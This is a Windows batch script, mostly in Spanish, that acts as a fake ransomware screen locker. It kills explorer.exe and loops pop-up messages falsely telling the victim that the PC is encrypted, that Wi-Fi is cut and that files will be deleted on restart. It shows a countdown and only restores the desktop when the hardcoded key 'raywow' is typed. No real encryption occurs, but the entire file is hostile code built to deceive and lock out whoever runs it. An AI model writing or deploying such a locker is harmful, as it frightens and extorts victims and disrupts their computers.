color 0A
@echo off 
title Encripted Pass 
taskkill /f /im explorer.exe 
:bucle 
cls               
msg * Hey
msg * Ten Cuidado, Acabas de condenar tu PC Asi que de nuevo!
msg * ESTE PROGRAMA TIENE RESTRICCIONES (NO CERRAR LA VENTANA DE ARRIBA)
msg * ESCRIBE DE NUEVO EL PASSWORD (TU CORREO ENVIADO)****** **
msg * -Reiniciar el software indica eliminar tus archivos importantes-
echo =============================================
echo NO CERRAR (Ya Se ha Encriptado el sistema *Wifi Desconected*)
echo =============================================
echo Encripted Password: Insert The key here! (45:00) Time Run Now!
echo =============================================
set /p pass=Inserta la key: 
if %pass%==raywow (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo Perfect The pass has Insert Succefully! Enjoy your life :)
start explorer.exe 
pause
exit